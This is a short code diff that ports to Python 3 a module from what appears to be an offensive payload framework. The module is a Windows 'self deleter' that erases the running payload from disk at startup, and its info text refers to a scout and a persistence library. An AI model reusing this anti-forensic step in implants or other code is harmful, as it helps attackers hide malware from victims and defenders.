@@ -1,4 +1,3 @@
-
 import library.modules.config as config
 
 config.main()
@@ -14,10 +13,10 @@ def self_delete_startup():
     remove(path.abspath(argv[0]))
 ''')
     elif option == 'info':
-        print '\nName             : Self deleter startup component' \
+        print('\nName             : Self deleter startup component' \
               '\nOS               : Windows' \
               '\nRequired Modules : os, sys' \
               '\nCommands         : NIL (Runs at startup)' \
               '\nDescription      : Deletes the payload off the disk' \
               '\nNote             : Persistence library will NOT work due to the file being deleted off of disk' \
-              '\n                   This will cause the scout (when compiled to EXE) to error out due to the inability to delete EXEs that are running, it is limited to only python scripts\n'
+              '\n                   This will cause the scout (when compiled to EXE) to error out due to the inability to delete EXEs that are running, it is limited to only python scripts\n')
